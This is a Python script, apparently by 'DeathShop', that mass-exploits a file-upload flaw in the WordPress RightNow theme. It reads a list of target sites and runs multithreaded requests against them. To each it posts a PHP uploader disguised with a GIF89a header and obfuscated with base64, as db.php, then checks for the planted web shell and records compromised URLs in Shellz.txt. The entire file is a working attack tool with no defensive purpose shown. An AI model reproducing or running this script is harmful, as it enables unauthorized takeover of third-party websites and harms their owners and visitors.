import sys , requests, re , json
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print(fc+"""
______                  _   __         ______   __                       
|_   _ `.               / |_[  |      .' ____ \ [  |                      
 | | `. \ .---.  ,--. `| |-'| |--.   | (___ \_| | |--.   .--.   _ .--.   
 | |  | |/ /__\\`'_\ : | |  | .-. |   _.____`.  | .-. |/ .'`\ \[ '/'`\ \ 
_| |_.' /| \__.,// | |,| |, | | | |  | \____) | | | | || \__. | | \__/ | 
|______.'  '.__.'\'-;__/\__/[___]|__]  \______.'[___]|__]'.__.' | ;.__/  
                                                               [__|      
                                                     Coded By DeathShop
                                                     CMS : Wordpress
                                                     Theme : RightNow 
""")

headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 'referer': 'www.google.com'}

uploader = """
GIF89a
<?php ?>
<!DOCTYPE html>
<html>
<head>
  <title>DeathShop Resultz</title>
</head>
<body><h1>DeathShop Uploader</h1>
  <form enctype='multipart/form-data' action='' method='POST'>
    <p>DeathShop Uploaded</p>
    <input type='file' name='uploaded_file'></input><br />
    <input type='submit' value='Upload'></input>
  </form>
</body>
</html>
<?PHP if(!empty($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')])){$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485=base64_decode('Li8=');$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485=$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485.basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]);if(move_uploaded_file($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('dG1wX25hbWU=')],$fdudxfib_d6fe1d0be6347b8ef2427fa629c04485)){echo base64_decode('VGhlIGZpbGUg').basename($_FILES[base64_decode('dXBsb2FkZWRfZmlsZQ==')][base64_decode('bmFtZQ==')]).base64_decode('IGhhcyBiZWVuIHVwbG9hZGVk');}else{echo base64_decode('VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiE=');}}?>
"""
requests.urllib3.disable_warnings()

def Exploit(Domain):
    try:
        if 'http' in Domain:
          Domain = Domain
        else:
          Domain = 'http://'+Domain
        myup = {'Filedata': ('db.php', uploader)}
        req = requests.post(Domain + '/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php', files=myup, headers=headers,verify=False, timeout=10).text
        req1 = requests.get(Domain + '/wp-content/uploads/settingsimages/db.php')
        if 'DeathShop' in req1:
          print (fg+'[+] '+ Domain + ' --> Shell Uploaded')
          open('Shellz.txt', 'a').write(Domain + '/wp-content/uploads/settingsimages/db.php' + '\n')
        else:
          print (fr+'[+] '+ Domain + '{}{} --> Not Vulnerability')
    except:
        print(fr+' -| ' + Domain + ' --> {}[Failed]')

target = open(input(fm+"Site List: "), "r").read().splitlines()
mp = Pool(int(input(fm+"Threads: ")))
mp.map(Exploit, target)
mp.close()
mp.join()